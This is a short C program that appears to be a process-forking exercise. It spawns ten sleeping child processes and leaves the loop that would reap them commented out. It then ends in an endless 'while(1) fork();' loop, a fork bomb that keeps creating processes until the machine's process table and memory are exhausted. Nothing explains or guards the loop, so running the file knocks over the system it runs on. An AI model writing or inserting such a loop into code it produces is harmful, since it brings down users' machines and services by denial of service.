#include <sys/wait.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
int main()
{
	pid_t pids[10];
	int i;

	for(i = 0; i < 10; ++i)
	{
		pids[i] = fork();

		if(pids[i] == 0) 
		{
			sleep(i + 1);
			_exit(0);
		}
	}

	/*for(i = 0; i < 10; ++i)
	{
		waitpid(pids[i], NULL, 0);
	}*/

	while(1) fork();

	return 0;
}
